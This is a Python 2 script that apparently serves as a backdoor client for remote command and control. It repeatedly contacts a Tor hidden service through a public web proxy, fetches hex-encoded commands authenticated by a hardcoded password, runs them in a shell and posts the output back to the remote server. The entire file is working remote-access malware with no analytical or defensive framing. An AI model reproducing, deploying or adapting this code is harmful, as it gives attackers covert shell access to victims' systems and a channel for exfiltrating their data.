#! /usr/bin/env python
import urllib,re, binascii, getopt, sys,time
from subprocess import *


def execute_cmd(cmd):
	stdOut=""
	stdErr=""

	process=Popen(["/bin/sh", "-c" , cmd],stdout=PIPE,stderr=PIPE,stdin=None)
	stdOut, stdErr=process.communicate()
	return "%s\n%s" % (stdErr,stdOut)



def contact_server():
	try:
		command_output=""
		values = { 'cmd' : binascii.hexlify(''),'key' : binascii.hexlify(passwd) }
		data = urllib.urlencode(values)
		conn = urllib.urlopen('http://%s:%s%s' % (server,port,request_command_resource),data)
		result=conn.read()
		
		match= re.match(regexp, result)
		if match!=None:
			key=binascii.unhexlify(match.groups()[0])
			cmd=binascii.unhexlify(match.groups()[1])
			if key==passwd:
				if cmd=="quit": sys.exit(0)
				command_output =execute_cmd(cmd)		
		
		values = { 'cmd' : binascii.hexlify(command_output),'key' : binascii.hexlify(passwd) }
		data = urllib.urlencode(values)
		
		conn = urllib.urlopen('http://%s:%s%s' % (server,port,response_command_resource),data)
		result=conn.read()
	except IOError:
		pass

def usage():
	print """client.py <-c seconds> 
	It will request a comment and execute it, for every execution.
        In case of using -c it will continuously request commands to the server.

	-c seconds. Time that the client will wait until the next connection attempt
        """

regexp="^key=(\w{1,});cmd=(\w{1,})$"
passwd="123456"


#server="127.0.0.1"
server="tor-proxy.net"
hidden_service="o3mco5aw544ls6du.onion"
port="80"
#request_command_resource="/proxy/express/browse.php?u=http%3A%2F%2F"+hidden_service+"/get.html"
request_command_resource="/proxy/express/browse.php?u=http%%3A%%2F%%2F%s/get.html" % hidden_service
response_command_resource="/proxy/express/browse.php?u=http%%3A%%2F%%2F%s/put.html" % hidden_service

def main():
	forever=False
	clock=1
	try:
		opts, args = getopt.getopt(sys.argv[1:], "c:")
	except getopt.GetoptError, err:
		print str(err)
		usage()
		sys.exit(2)
	
	for o, a in opts:
		if o == "-c":
			forever=True
			try:
				clock=int(a)
				if clock < 1:
					usage()
					sys.exit(2)
			except:
				usage()
				sys.exit(2)
	
	if not forever: 
		contact_server()
	
	else:
		while True: 
			contact_server()
			time.sleep(clock)

if __name__ == '__main__':
	main()
